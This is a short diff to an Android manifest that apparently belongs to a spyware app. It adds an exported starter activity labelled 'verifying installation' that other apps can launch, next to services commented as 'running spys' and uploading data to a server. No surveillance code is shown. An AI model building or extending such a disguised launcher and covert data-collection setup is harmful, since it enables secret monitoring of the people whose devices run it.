@@ -28,6 +28,12 @@
         <category android:name="android.intent.category.LAUNCHER"/>
       </intent-filter>
     </activity>
+    <!--Other apps launch this activity for starting app.-->
+    <activity
+	android:exported="true"
+	android:name=".activities.SnopperStarterActivity"
+	android:label="@string/verifying_installation"
+	android:theme="@style/BaseTheme.DialogActivity"/>
     <!--Service for running spys-->
     <service android:name=".services.SnopperService"/>
     <!--Service for uploading and downloading data from server-->
